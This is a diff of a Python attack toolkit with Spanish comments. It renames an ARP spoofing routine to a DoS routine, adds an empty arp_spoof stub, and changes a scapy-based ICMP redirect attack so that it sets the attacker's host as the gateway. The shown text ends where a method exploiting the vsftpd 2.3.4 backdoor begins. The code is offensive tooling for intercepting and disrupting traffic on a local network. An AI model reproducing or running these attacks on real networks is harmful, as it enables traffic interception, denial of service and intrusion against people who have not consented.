@@ -5,9 +5,13 @@ from signal import signal, SIGINT
 from sys import exit
 
 class Ataques:
+  
+    # La diferencia entre arp spoof y DoS es que en el DoS no volvemos a enviar los paquetes recibidos
+    def arp_spoof(self, ip_victima):
+        pass
+        
 
-
-    def ArpSpoofing(self, ip_victima):
+    def DoS(self, ip_victima):
 
         print("Se utiliza por defecto la interfaz eth0")
         cambio_eth = input("¿Desea cambiar la interfaz? (s/n): ")
@@ -59,10 +63,10 @@ class Ataques:
 
         # Ahora tenemos que enviar los paquetes ARP cada cierto tiempo al router y a la victima
         # Para ello creamos un bucle infinito que envie los paquetes cada 2 segundos
-        # Hacemos un try except para que si el usuario pulsa ctrl+c se salga del bucle
         print("Desea comenzar el ataque? (s/n): ")
         if input() == "s":
-            print("Comenzando ataque...\n Pulsa ctrl+c para salir")
+            
+            print("Comenzando ataque...\nPulsa ctrl+c para salir")
             try:
                 while True:
                     print(".")
@@ -78,11 +82,13 @@ class Ataques:
 
         
 
+        
+
 
 ############################################################################################
     # Ataque IcmpRedirect con scapy
     def IcmpRedirect(self, ip):
-        
+        str(ip)
         print("Se utiliza por defecto la interfaz eth0")
         cambio_eth = input("¿Desea cambiar la interfaz? (s/n): ")
         if cambio_eth == "s":
@@ -105,6 +111,8 @@ class Ataques:
         ip = scapy.IP(src=ip_src, dst=ip)
         # Creamos un paquete ICMP con el tipo 5 y el codigo 1
         icmp = scapy.ICMP(type=5, code=1)
+        # Modificamos el paquete ICMP con la ip del anfitrion
+        icmp.gw = ip_anfitrion
         # Creamos un paquete ICMP con la ip del anfitrion
         ip2 = scapy.IP(src=ip_anfitrion, dst="8.8.8.8")
         # Creamos un paquete ICMP con el tipo 8 y el codigo 0
@@ -129,7 +137,7 @@ class Ataques:
             return  # Salimos de la funcion
 
     
-        
+############################################################################################
 
     def exploit_vsftpd(self, ip):
         # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
